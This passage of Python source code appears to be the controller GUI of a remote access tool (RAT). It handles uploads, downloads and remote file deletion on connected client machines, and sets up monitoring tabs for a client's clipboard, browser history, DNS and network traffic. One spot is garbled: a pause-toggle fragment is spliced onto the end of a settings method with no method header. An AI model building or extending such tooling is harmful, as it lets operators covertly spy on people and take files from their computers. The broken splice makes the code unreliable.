            return False, "No saved state found"
            
        state = self.transfer_states[transfer_id]
        
        if state['type'] == 'upload':
            # Check that source file exists and is the right size
            if not os.path.exists(state['file_path']):
                return False, "Source file no longer exists"
                
            current_size = os.path.getsize(state['file_path'])
            if current_size != state['total_size']:
                return False, "Source file has changed size"
                
        elif state['type'] == 'download':
            # Check that local file exists if we're supposed to resume
            if state['position'] > 0 and not os.path.exists(state['local_file']):
                return False, "Local file missing for resume"
                
        return True, "OK"
    
    def save_transfer_states(self):
        """Save transfer states to a file with enhanced error handling."""
        if not hasattr(self, 'transfer_states'):
            return
            
        try:
            with open("transfer_states.json", "w") as f:
                # Convert complex objects to serializable format
                serializable_states = {}
                for transfer_id, state in self.transfer_states.items():
                    serializable_states[transfer_id] = {
                        'type': state['type'],
                        'total_size': state['total_size'],
                        'position': state['position'],
                        'start_time': state['start_time']
                    }
                    
                    if state['type'] == 'upload':
                        serializable_states[transfer_id]['file_path'] = state['file_path']
                        serializable_states[transfer_id]['dest_path'] = state['dest_path']
                    else:  # download
                        serializable_states[transfer_id]['remote_file'] = state['remote_file']
                        serializable_states[transfer_id]['local_file'] = state['local_file']
                
                json.dump(serializable_states, f)
        except Exception as e:
            self.rat_app.log(f"Error saving transfer states: {e}")

    def load_transfer_states(self):
        """Load transfer states from a file with enhanced error handling."""
        try:
            self.transfer_states = {}
            
            if os.path.exists("transfer_states.json"):
                with open("transfer_states.json", "r") as f:
                    try:
                        loaded_states = json.load(f)
                        
                        # Validate loaded data
                        if isinstance(loaded_states, dict):
                            self.transfer_states = loaded_states
                            
                            # Update UI to enable resume button if needed
                            if self.transfer_states and hasattr(self, 'resume_btn'):
                                self.resume_btn.configure(state="normal")
                    except json.JSONDecodeError:
                        self.rat_app.log("Error parsing transfer states file - corrupted JSON")
        except Exception as e:
            self.rat_app.log(f"Error loading transfer states: {e}")
    
    def update_client_info(self):
        """Update the client info when a client is selected."""
        if not hasattr(self, 'client_info_label'):
            return
            
        if self.rat_app.current_client_socket:
            for addr, (client_id, conn) in self.rat_app.clients.items():
                if conn == self.rat_app.current_client_socket:
                    self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                    self.connection_status.configure(text="", text_color="#00AA00")
                    return
        
        self.client_info_label.configure(text="None")
        self.connection_status.configure(text="", text_color="#FF5555")
    
    #--------------------------------------------------------
    # Drag and Drop Support
    #--------------------------------------------------------
    
    def setup_drag_drop(self):
        """Setup drag and drop functionality for file uploads."""
        try:
            # Only import if available (not all Python installations have this)
            import tkinterdnd2 as tkdnd
            
            # Enable drag and drop for the upload file entry
            if hasattr(self, 'upload_file_entry'):
                tkdnd.register_drop_target(self.upload_file_entry, "DND_Files")
                self.upload_file_entry.dnd_bind('<<Drop>>', self.on_drop_upload)
                
            # Enable drag and drop for the upload info text area
            if hasattr(self, 'upload_info_text'):
                tkdnd.register_drop_target(self.upload_info_text, "DND_Files")
                self.upload_info_text.dnd_bind('<<Drop>>', self.on_drop_upload)
                
            # Enable drag and drop for the entire upload frame
            if hasattr(self, 'upload_frame'):
                tkdnd.register_drop_target(self.upload_frame, "DND_Files")
                self.upload_frame.dnd_bind('<<Drop>>', self.on_drop_upload)
                
        except ImportError:
            # Drag and drop not available, just log it
            self.rat_app.log("Drag and drop support not available (tkinterdnd2 not installed)")
    
    def on_drop_upload(self, event):
        """Handle dropped files for upload."""
        file_paths = event.data
        
        # Handle different formats (Windows vs Unix)
        if '{' in file_paths:
            # Windows format: {C:/path/to/file1} {C:/path/to/file2}
            file_paths = file_paths.strip('{}').split('} {')
        else:
            # Unix format: file:///path/to/file
            file_paths = [file_paths.replace('file://', '')]
            
        # Clean up paths
        cleaned_paths = []
        for path in file_paths:
            # Remove URL encoding
            path = path.replace('%20', ' ')
            # Remove trailing spaces
            path = path.strip()
            # Add to list if valid
            if os.path.exists(path):
                cleaned_paths.append(path)
        
        if not cleaned_paths:
            return
            
        # Update UI based on single or multiple files
        if len(cleaned_paths) == 1:
            # Single file
            self.upload_file_entry.delete(0, tk.END)
            self.upload_file_entry.insert(0, cleaned_paths[0])
            self.selected_files = cleaned_paths
            self.update_file_info(cleaned_paths[0])
            
            # Set single file mode
            if hasattr(self, 'multiple_files_var'):
                self.multiple_files_var.set(False)
                self.toggle_multiple_files_mode()
        else:
            # Multiple files
            self.upload_file_entry.delete(0, tk.END)
            self.upload_file_entry.insert(0, f"{len(cleaned_paths)} files selected")
            self.selected_files = cleaned_paths
            self.update_multifile_info(cleaned_paths)
            
            # Set multiple files mode
            if hasattr(self, 'multiple_files_var'):
                self.multiple_files_var.set(True)
                self.toggle_multiple_files_mode()
    
    #--------------------------------------------------------
    # Enhanced Keyboard Shortcuts
    #--------------------------------------------------------
    
    def setup_keyboard_shortcuts(self):
        """Setup keyboard shortcuts for common operations."""
        # Bind to the main file frame
        if hasattr(self, 'file_frame'):
            # Upload shortcuts
            self.file_frame.bind("<Control-u>", lambda e: self.upload_file())
            
            # Download shortcuts
            self.file_frame.bind("<Control-d>", lambda e: self.download_file())
            
            # Navigation shortcuts
            self.file_frame.bind("<Alt-Up>", lambda e: self.navigate_back())
            self.file_frame.bind("<F5>", lambda e: self.list_remote_files())
            
            # Cancel shortcuts
            self.file_frame.bind("<Escape>", lambda e: self.cancel_transfer())
            
            # Tab shortcuts
            self.file_frame.bind("<Control-1>", lambda e: self.transfer_notebook.select(0))  # Upload tab
            self.file_frame.bind("<Control-2>", lambda e: self.transfer_notebook.select(1))  # Download tab
            self.file_frame.bind("<Control-3>", lambda e: self.transfer_notebook.select(2))  # Queue tab
            self.file_frame.bind("<Control-4>", lambda e: self.transfer_notebook.select(3))  # History tab
            
            # Queue shortcuts
            self.file_frame.bind("<Control-p>", lambda e: self.process_all_queue())
            
            # Resume shortcuts
            self.file_frame.bind("<Control-r>", lambda e: self.show_resume_dialog())
            
            # File operations
            self.file_frame.bind("<Delete>", lambda e: self.delete_remote_file())
            self.file_frame.bind("<F2>", lambda e: self.rename_remote_file())
            self.file_frame.bind("<Control-n>", lambda e: self.create_remote_folder())
            
            # Filter shortcuts
            self.file_frame.bind("<Control-f>", self.focus_filter)
            
            # Copy path shortcuts
            self.file_frame.bind("<Control-c>", lambda e: self.copy_path_to_clipboard())
    
    def focus_filter(self, event=None):
        """Focus the filter entry field."""
        if hasattr(self, 'filter_entry'):
            self.filter_entry.focus_set()
    
    #--------------------------------------------------------
    # Theme Integration
    #--------------------------------------------------------
    
    def apply_theme(self, theme_name=None):
        """Apply a theme to all UI elements."""
        if theme_name:
            # Update theme
            if hasattr(self.rat_app, 'THEMES') and theme_name in self.rat_app.THEMES:
                self.rat_app.current_theme = theme_name
            elif theme_name in THEMES:
                self.rat_app.current_theme = theme_name
        
        # Get current theme colors
        theme = self.get_theme_colors()
        
        # Apply to various UI elements
        if hasattr(self, 'file_frame'):
            self.file_frame.configure(fg_color=theme["bg_color"])
        
        # Update cards
        for card in ['client_card', 'status_card', 'source_card', 'dest_card', 'info_card']:
            if hasattr(self, card):
                getattr(self, card).configure(fg_color=theme["card_color"])
        
        # Update buttons
        if hasattr(self, 'upload_btn'):
            self.upload_btn.configure(
                fg_color=theme["accent_color"],
                hover_color=theme["hover_color"]
            )
        
        if hasattr(self, 'download_btn'):
            self.download_btn.configure(
                fg_color=theme["accent_color"],
                hover_color=theme["hover_color"]
            )
        
        if hasattr(self, 'cancel_btn'):
            self.cancel_btn.configure(
                fg_color=theme["danger_color"],
                hover_color=theme["hover_color"]
            )
        
        # Update progress bar
        if hasattr(self, 'progress_bar'):
            self.progress_bar.configure(
                progress_color=theme["accent_color"]
            )
        
        # Update treeview styles
        self.configure_treeview_style(theme)
        
        # Update tab styles
        style = ttk.Style()
        style.configure("Custom.TNotebook", background=theme["bg_color"])
        style.map("Custom.TNotebook", background=[("selected", theme["bg_color"])])
    
    #--------------------------------------------------------
    # Settings Management
    #--------------------------------------------------------
    
    def save_settings(self):
        """Save user settings and preferences."""
        settings = {
            # Recent paths
            'recent_upload_paths': getattr(self, 'recent_upload_paths', []),
            'recent_download_paths': getattr(self, 'recent_download_paths', []),
            
            # Default options
            'default_overwrite': getattr(self, 'overwrite_var', tk.BooleanVar(value=True)).get(),
            'default_queue': getattr(self, 'queue_var', tk.BooleanVar(value=False)).get(),
            'default_priority': getattr(self, 'priority_var', tk.StringVar(value="Normal")).get(),
            
            # UI preferences
            'show_hidden_files': self.show_hidden_files,
            
            # Last used paths
            'last_upload_dest': self.upload_dest_entry.get() if hasattr(self, 'upload_dest_entry') else "",
            'last_download_dest': self.download_dest_entry.get() if hasattr(self, 'download_dest_entry') else "",
            'last_remote_path': self.remote_path_entry.get() if hasattr(self, 'remote_path_entry') else "",
            
            # Last selected tab
            'last_tab': self.transfer_notebook.index(self.transfer_notebook.select()) if hasattr(self, 'transfer_notebook') else 0,
            
            # Sort preferences
            'sort_column': getattr(self, 'current_sort_column', "Name"),
            'sort_direction': getattr(self, 'sort_direction', "ascending")
        }
        
        try:
            with open("file_transfer_settings.json", "w") as f:
                json.dump(settings, f)
        except Exception as e:
            self.rat_app.log(f"Error saving settings: {e}")
    
    def load_settings(self):
        """Load user settings and preferences."""
        if not os.path.exists("file_transfer_settings.json"):
            return
            
        try:
            with open("file_transfer_settings.json", "r") as f:
                settings = json.load(f)
                
                # Recent paths
                self.recent_upload_paths = settings.get('recent_upload_paths', [])
                self.recent_download_paths = settings.get('recent_download_paths', [])
                
                # Default options
                if hasattr(self, 'overwrite_var'):
                    self.overwrite_var.set(settings.get('default_overwrite', True))
                if hasattr(self, 'queue_var'):
                    self.queue_var.set(settings.get('default_queue', False))
                if hasattr(self, 'priority_var'):
                    self.priority_var.set(settings.get('default_priority', "Normal"))
                
                # UI preferences
                self.show_hidden_files = settings.get('show_hidden_files', False)
                
                # Update UI for show_hidden_files
                if hasattr(self, 'toggle_hidden_btn'):
                    theme = self.get_theme_colors()
                    self.toggle_hidden_btn.configure(
                        fg_color=theme["accent_color"] if self.show_hidden_files else theme["button_color"]
                    )
                
                # Last used paths
                if settings.get('last_upload_dest') and hasattr(self, 'upload_dest_entry'):
                    self.upload_dest_entry.delete(0, tk.END)
                    self.upload_dest_entry.insert(0, settings.get('last_upload_dest'))
                
                if settings.get('last_download_dest') and hasattr(self, 'download_dest_entry'):
                    self.download_dest_entry.delete(0, tk.END)
                    self.download_dest_entry.insert(0, settings.get('last_download_dest'))
                
                if settings.get('last_remote_path') and hasattr(self, 'remote_path_entry'):
                    self.remote_path_entry.delete(0, tk.END)
                    self.remote_path_entry.insert(0, settings.get('last_remote_path'))
                
                # Sorting preferences
                self.current_sort_column = settings.get('sort_column', "Name")
                self.sort_direction = settings.get('sort_direction', "ascending")
                
                # Select last used tab
                if hasattr(self, 'transfer_notebook'):
                    last_tab = settings.get('last_tab', 0)
                    if 0 <= last_tab < len(self.transfer_notebook.tabs()):
                        self.transfer_notebook.select(last_tab)
                        
        except Exception as e:
            self.rat_app.log(f"Error loading settings: {e}")
    
    #--------------------------------------------------------
    # Additional UI Enhancement Methods
    #--------------------------------------------------------
    
    def add_bookmarks(self, path):
        """Add a path to bookmarks."""
        if not hasattr(self, 'bookmarks'):
            self.bookmarks = []
            
        # Don't add duplicates
        if path not in self.bookmarks:
            self.bookmarks.append(path)
            
        # Save to settings
        self.save_settings()
    
    def show_bookmarks(self):
        """Show a popup with bookmarked locations."""
        if not hasattr(self, 'bookmarks') or not self.bookmarks:
            # If no bookmarks exist, ask to add current path
            if hasattr(self, 'remote_path_entry'):
                current_path = self.remote_path_entry.get()
                if current_path:
                    confirm = messagebox.askyesno("No Bookmarks", 
                                               "No bookmarks found. Add current path?")
                    if confirm:
                        self.add_bookmarks(current_path)
                        messagebox.showinfo("Bookmark Added", f"Added: {current_path}")
                    return
            
            messagebox.showinfo("No Bookmarks", "No bookmarks available")
            return
            
        # Create popup menu for bookmarks
        theme = self.get_theme_colors()
        bookmark_menu = tk.Menu(self.file_frame, tearoff=0)
        
        # Add each bookmark
        for path in self.bookmarks:
            # Create a lambda with path as default argument to avoid late binding issue
            bookmark_menu.add_command(label=path, 
                                  command=lambda p=path: self.navigate_to_bookmark(p))
        
        # Add separator and management options
        bookmark_menu.add_separator()
        bookmark_menu.add_command(label="Add Current Path", 
                              command=self.add_current_to_bookmarks)
        bookmark_menu.add_command(label="Manage Bookmarks", 
                              command=self.manage_bookmarks)
        
        # Show the menu
        try:
            if hasattr(self, 'bookmark_btn'):
                x = self.bookmark_btn.winfo_rootx()
                y = self.bookmark_btn.winfo_rooty() + self.bookmark_btn.winfo_height()
                bookmark_menu.post(x, y)
            else:
                bookmark_menu.post(self.file_frame.winfo_pointerx(), 
                               self.file_frame.winfo_pointery())
        except:
            # Fallback if post fails
            bookmark_menu.post(self.file_frame.winfo_pointerx(), 
                           self.file_frame.winfo_pointery())
    
    def navigate_to_bookmark(self, path):
        """Navigate to a bookmarked path."""
        if hasattr(self, 'remote_path_entry'):
            self.remote_path_entry.delete(0, tk.END)
            self.remote_path_entry.insert(0, path)
            
            # List files in the bookmarked location
            self.list_remote_files()
    
    def add_current_to_bookmarks(self):
        """Add current path to bookmarks."""
        if hasattr(self, 'remote_path_entry'):
            current_path = self.remote_path_entry.get()
            if current_path:
                self.add_bookmarks(current_path)
                messagebox.showinfo("Bookmark Added", f"Added: {current_path}")
    
    def manage_bookmarks(self):
        """Show dialog to manage bookmarks."""
        if not hasattr(self, 'bookmarks'):
            self.bookmarks = []
            
        # Create dialog
        theme = self.get_theme_colors()
        dialog = ctk.CTkToplevel(self.file_frame)
        dialog.title("Manage Bookmarks")
        dialog.geometry("500x300")
        dialog.grab_set()
        
        # Create list frame
        list_frame = ctk.CTkFrame(dialog, fg_color=theme["card_color"],
                              corner_radius=10)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = ctk.CTkLabel(list_frame, text=" Manage Bookmarks", 
                               font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                              size=FONT_STYLES["subheading"][1], 
                                              weight=FONT_STYLES["subheading"][2]))
        title_label.pack(anchor="w", padx=15, pady=(10, 15))
        
        # Create listbox for bookmarks
        list_container = ctk.CTkFrame(list_frame, fg_color=theme["bg_color"])
        list_container.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        listbox = tk.Listbox(list_container, bg=theme["bg_color"], fg=theme["fg_color"], 
                         selectbackground=theme["accent_color"],
                         font=ctk.CTkFont(size=12))
        listbox.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Add scrollbar
        scrollbar = tk.Scrollbar(listbox, orient="vertical", command=listbox.yview)
        listbox.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Add bookmarks to listbox
        for path in self.bookmarks:
            listbox.insert(tk.END, path)
        
        # Button functions
        def remove_selected():
            selection = listbox.curselection()
            if not selection:
                return
                
            # Convert to list of indices and sort in reverse to avoid index shifting
            indices = sorted(list(selection), reverse=True)
            
            # Remove each selected bookmark
            for idx in indices:
                if 0 <= idx < len(self.bookmarks):
                    del self.bookmarks[idx]
            
            # Update listbox
            listbox.delete(0, tk.END)
            for path in self.bookmarks:
                listbox.insert(tk.END, path)
                
            # Save to settings
            self.save_settings()
        
        def add_new():
            new_path = simpledialog.askstring("Add Bookmark", "Enter path:")
            if new_path:
                self.add_bookmarks(new_path)
                
                # Update listbox
                listbox.delete(0, tk.END)
                for path in self.bookmarks:
                    listbox.insert(tk.END, path)
        
        # Button frame
        button_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        
        remove_btn = ctk.CTkButton(button_frame, text="Remove Selected", 
                                command=remove_selected,
                                fg_color=theme["danger_color"],
                                hover_color=theme["hover_color"],
                                corner_radius=8)
        remove_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        add_btn = ctk.CTkButton(button_frame, text="Add New", 
                             command=add_new,
                             fg_color=theme["button_color"],
                             hover_color=theme["hover_color"],
                             corner_radius=8)
        add_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        close_btn = ctk.CTkButton(button_frame, text="Close", 
                               command=dialog.destroy,
                               fg_color=theme["accent_color"],
                               hover_color=theme["hover_color"],
                               corner_radius=8)
        close_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
    
    def show_recent_paths(self):
        """Show a popup with recent destination paths."""
        if not hasattr(self, 'recent_upload_paths') or not self.recent_upload_paths:
            messagebox.showinfo("No Recent Paths", "No recent paths available")
            return
            
        # Create popup menu for recent paths
        recent_menu = tk.Menu(self.file_frame, tearoff=0)
        
        # Add each recent path
        for path in self.recent_upload_paths:
            recent_menu.add_command(label=path, 
                                command=lambda p=path: self.set_destination_path(p))
        
        # Add separator and clear option
        recent_menu.add_separator()
        recent_menu.add_command(label="Clear Recent Paths", 
                             command=self.clear_recent_paths)
        
        # Show the menu
        try:
            if hasattr(self, 'recent_paths_btn'):
                x = self.recent_paths_btn.winfo_rootx()
                y = self.recent_paths_btn.winfo_rooty() + self.recent_paths_btn.winfo_height()
                recent_menu.post(x, y)
            else:
                recent_menu.post(self.file_frame.winfo_pointerx(), 
                             self.file_frame.winfo_pointery())
        except:
            # Fallback if post fails
            recent_menu.post(self.file_frame.winfo_pointerx(), 
                         self.file_frame.winfo_pointery())
    
    def set_destination_path(self, path):
        """Set the destination path entry."""
        if hasattr(self, 'upload_dest_entry'):
            self.upload_dest_entry.delete(0, tk.END)
            self.upload_dest_entry.insert(0, path)
    
    def clear_recent_paths(self):
        """Clear the list of recent paths."""
        if hasattr(self, 'recent_upload_paths'):
            self.recent_upload_paths = []
            self.save_settings()
            messagebox.showinfo("Cleared", "Recent paths have been cleared")
    
    def update_recent_paths(self, path):
        """Add a path to recent paths list."""
        if not hasattr(self, 'recent_upload_paths'):
            self.recent_upload_paths = []
            
        # Don't add duplicates, move to top if exists
        if path in self.recent_upload_paths:
            self.recent_upload_paths.remove(path)
            
        # Add to beginning of list
        self.recent_upload_paths.insert(0, path)
        
        # Keep only the most recent 10 paths
        self.recent_upload_paths = self.recent_upload_paths[:10]
        
        # Save to settings
        self.save_settings()
    
    #--------------------------------------------------------
    # Main Initialization
    #--------------------------------------------------------
    
    def initialize(self):
        """Initialize the file transfer system with all enhancements."""
        # Load settings first so they're available to UI components
        self.load_settings()
        
        # Load saved history
        self.load_history()
        
        # Setup drag and drop
        self.setup_drag_drop()
        
        # Setup keyboard shortcuts
        self.setup_keyboard_shortcuts()
        
        # Apply current theme
        self.apply_theme()
        
        # Initialize client info
        self.update_client_info()
        
        # Set initial UI state
        self.update_ui_for_transfer(False)
        
        # Auto-refresh file list if on download tab and client connected
        if self.transfer_notebook.index(self.transfer_notebook.select()) == 1:
            if self.rat_app.current_client_socket:
                self.list_remote_files()
        
        # Start auto-save timer for settings (saves every 2 minutes)
        self.file_frame.after(120000, self.auto_save_settings)
    
    def auto_save_settings(self):
        """Automatically save settings periodically."""
        self.save_settings()
        # Schedule next save
        self.file_frame.after(120000, self.auto_save_settings)

        if not hasattr(self, 'is_paused'):
            self.is_paused = False
            
        self.is_paused = not self.is_paused
        
        if self.is_paused:
            # Pause transfer
            self.pause_btn.configure(text="Resume")
            self.status_value.configure(text="Paused")
            
            # Additional pause implementation would depend on 
            # how transfers are handled in the actual system
        else:
            # Resume transfer
            self.pause_btn.configure(text="Pause")
            self.status_value.configure(text="Transferring")
            
            # Additional resume implementation would depend on
            # how transfers are handled in the actual system
            
class AdvancedMonitoringInterface:
    """Interface for advanced monitoring features on the server side"""
    
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        
        # Setup UI
        self.setup_ui()
        
    def get_theme_colors(self):
        """Get the current theme colors from the rat_app."""
        theme_name = self.rat_app.current_theme
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            return self.rat_app.THEMES[theme_name]
        else:
            return self.rat_app.THEMES[theme_name]
            
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available."""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            tm = self.rat_app.theme_manager
            
            # Register frames
            tm.track_widget(self.advanced_monitoring_frame)
            
            # Register notebooks
            tm.track_widget(self.adv_monitor_notebook, "notebook")
            
            # Register buttons
            for button in self.buttons:
                tm.track_widget(button)
            
            # Register text widgets
            for text_widget in self.text_widgets:
                tm.track_widget(text_widget, "scrolledtext")
    
    def setup_ui(self):
        # Get theme colors
        theme = self.get_theme_colors()
        
        # Create main frame
        self.advanced_monitoring_frame = ctk.CTkFrame(self.parent)
        self.parent.add(self.advanced_monitoring_frame, text="Advanced Monitoring")
        
        # Track buttons and text widgets for theme management
        self.buttons = []
        self.text_widgets = []
        
        # Create notebook for different monitoring tabs
        self.adv_monitor_notebook = ttk.Notebook(self.advanced_monitoring_frame, style="Custom.TNotebook")
        self.adv_monitor_notebook.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        # Setup tabs

        self.setup_network_analysis_tab()
        self.setup_clipboard_tab()
        self.setup_browser_tab()
        self.setup_dns_tab()
        self.setup_system_info_tab()
        # Register with theme manager
        self.register_with_theme_manager()
    
    
    def setup_network_analysis_tab(self):
        """Setup the network analysis tab with real-time visualization"""
        theme = self.get_theme_colors()
        
        # Create network analysis frame
        self.network_analysis_frame = ctk.CTkFrame(self.adv_monitor_notebook, fg_color=theme["bg_color"])
        self.adv_monitor_notebook.add(self.network_analysis_frame, text="Network Analysis")
        
        # Controls panel
        controls_frame = ctk.CTkFrame(self.network_analysis_frame, fg_color=theme["card_color"], corner_radius=10)
        controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display
        client_label = ctk.CTkLabel(controls_frame, text="Connected Client:")
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.analysis_client_label = ctk.CTkLabel(controls_frame, text="None")
        self.analysis_client_label.pack(side=tk.LEFT, padx=5)
        
        # Analysis controls
        buttons_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.start_analysis_btn = ctk.CTkButton(buttons_frame, text="Start Traffic Analysis", 
                                            command=self.start_traffic_analysis,
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"])
        self.start_analysis_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_analysis_btn = ctk.CTkButton(buttons_frame, text="Stop Analysis", 
                                            command=self.stop_traffic_analysis,
                                            state="disabled",
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"])
        self.stop_analysis_btn.pack(side=tk.LEFT, padx=5)
        
        # Create tabbed interface for different analysis views
        analysis_notebook = ttk.Notebook(self.network_analysis_frame, style="Custom.TNotebook")
        analysis_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Overview frame with summary metrics
        overview_frame = ctk.CTkFrame(analysis_notebook, fg_color=theme["bg_color"])
        analysis_notebook.add(overview_frame, text="Overview")
        
        # Summary metrics - layout using grid
        metrics_frame = ctk.CTkFrame(overview_frame, fg_color=theme["card_color"], corner_radius=10)
        metrics_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Metrics
        metrics_title = ctk.CTkLabel(metrics_frame, text="Traffic Summary", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]))
        metrics_title.pack(anchor="w", padx=15, pady=5)
        
        metrics_grid = ctk.CTkFrame(metrics_frame, fg_color="transparent")
        metrics_grid.pack(fill=tk.X, padx=15, pady=5)
        
        # Total packets
        packets_label = ctk.CTkLabel(metrics_grid, text="Total Packets:")
        packets_label.grid(row=0, column=0, sticky="w", padx=5, pady=2)
        
        self.packets_value = ctk.CTkLabel(metrics_grid, text="0")
        self.packets_value.grid(row=0, column=1, sticky="w", padx=5, pady=2)
        
        # Total traffic
        traffic_label = ctk.CTkLabel(metrics_grid, text="Total Traffic:")
        traffic_label.grid(row=1, column=0, sticky="w", padx=5, pady=2)
        
        self.traffic_value = ctk.CTkLabel(metrics_grid, text="0 bytes")
        self.traffic_value.grid(row=1, column=1, sticky="w", padx=5, pady=2)
        
        # Packets per second
        pps_label = ctk.CTkLabel(metrics_grid, text="Packets/sec:")
        pps_label.grid(row=0, column=2, sticky="w", padx=5, pady=2)
        
        self.pps_value = ctk.CTkLabel(metrics_grid, text="0")
        self.pps_value.grid(row=0, column=3, sticky="w", padx=5, pady=2)
        
        # Bandwidth
        bandwidth_label = ctk.CTkLabel(metrics_grid, text="Bandwidth:")
        bandwidth_label.grid(row=1, column=2, sticky="w", padx=5, pady=2)
        
        self.bandwidth_value = ctk.CTkLabel(metrics_grid, text="0 Mbps")
        self.bandwidth_value.grid(row=1, column=3, sticky="w", padx=5, pady=2)
        
        # Protocol distribution chart
        self.protocol_frame = ctk.CTkFrame(overview_frame, fg_color=theme["card_color"], corner_radius=10, height=200)
        self.protocol_frame.pack(fill=tk.X, padx=10, pady=10)
        
        protocol_title = ctk.CTkLabel(self.protocol_frame, text="Protocol Distribution", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]))
        protocol_title.pack(anchor="w", padx=15, pady=5)
        
        # This frame will hold the chart created with matplotlib
        self.protocol_chart_frame = ctk.CTkFrame(self.protocol_frame, fg_color="transparent", height=150)
        self.protocol_chart_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)
        
        # Connections frame with active connections list
        connections_frame = ctk.CTkFrame(analysis_notebook, fg_color=theme["bg_color"])
        analysis_notebook.add(connections_frame, text="Connections")
        
        # Create treeview for connections list
        conn_list_frame = ctk.CTkFrame(connections_frame, fg_color=theme["card_color"], corner_radius=10)
        conn_list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        conn_title = ctk.CTkLabel(conn_list_frame, text="Active Connections", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                            size=FONT_STYLES["subheading"][1], 
                                            weight=FONT_STYLES["subheading"][2]))
        conn_title.pack(anchor="w", padx=15, pady=5)
        
        # Create treeview with columns
        columns = ("Source", "Destination", "Protocol", "Port", "Bytes", "Packets", "Last Seen")
        self.connections_tree = ttk.Treeview(conn_list_frame, columns=columns, 
                                        show="headings", style="Custom.Treeview")
        
        # Configure columns
        for col in columns:
            self.connections_tree.heading(col, text=col)
            if col in ["Source", "Destination"]:
                self.connections_tree.column(col, width=150)
            elif col == "Protocol":
                self.connections_tree.column(col, width=70)
            else:
                self.connections_tree.column(col, width=100)
        
        # Add scrollbar
        conn_scrollbar = ttk.Scrollbar(conn_list_frame, orient=tk.VERTICAL, 
                                    command=self.connections_tree.yview,
                                    style="Custom.Vertical.TScrollbar")
        self.connections_tree.configure(yscroll=conn_scrollbar.set)
        
        # Pack components
        conn_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.connections_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Add filter entry
        filter_frame = ctk.CTkFrame(conn_list_frame, fg_color="transparent")
        filter_frame.pack(fill=tk.X, padx=10, pady=5)
        
        filter_label = ctk.CTkLabel(filter_frame, text="Filter:")
        filter_label.pack(side=tk.LEFT, padx=5)
        
        self.conn_filter_entry = ctk.CTkEntry(filter_frame, width=200)
        self.conn_filter_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.conn_filter_entry.bind("<KeyRelease>", self.filter_connections)
        
        # Traffic graph frame for visualizing traffic over time
        traffic_frame = ctk.CTkFrame(analysis_notebook, fg_color=theme["bg_color"])
        analysis_notebook.add(traffic_frame, text="Traffic Graph")
        
        graph_frame = ctk.CTkFrame(traffic_frame, fg_color=theme["card_color"], corner_radius=10)
        graph_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        graph_title = ctk.CTkLabel(graph_frame, text="Network Traffic Over Time", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]))
        graph_title.pack(anchor="w", padx=15, pady=5)
        
        # Frame for the matplotlib traffic graph
        self.traffic_graph_frame = ctk.CTkFrame(graph_frame, fg_color="transparent")
        self.traffic_graph_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)
        
        # Time range selection
        timerange_frame = ctk.CTkFrame(graph_frame, fg_color="transparent")
        timerange_frame.pack(fill=tk.X, padx=15, pady=5)
        
        timerange_label = ctk.CTkLabel(timerange_frame, text="Time Range:")
        timerange_label.pack(side=tk.LEFT, padx=5)
        
        self.timerange_var = tk.StringVar(value="5 minutes")
        timerange_menu = ctk.CTkOptionMenu(timerange_frame, 
                                        values=["1 minute", "5 minutes", "15 minutes", "30 minutes", "1 hour"],
                                        variable=self.timerange_var,
                                        command=self.update_traffic_graph,
                                        fg_color=theme["button_color"],
                                        button_color=theme["button_color"])
        timerange_menu.pack(side=tk.LEFT, padx=5)
        self.create_frequency_chart()
        
    def start_traffic_analysis(self):
        """Start real-time network traffic analysis"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        # Initialize data structures for analysis
        self.network_data = {
            'start_time': time.time(),
            'total_packets': 0,
            'total_bytes': 0,
            'protocols': {},
            'connections': {},
            'traffic_history': [],  # For the time-series graph
            'last_update': time.time()
        }
        
        try:
            # Send command to start capturing with analysis
            self.rat_app.current_client_socket.send("START_NETWORK_ANALYSIS".encode())
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
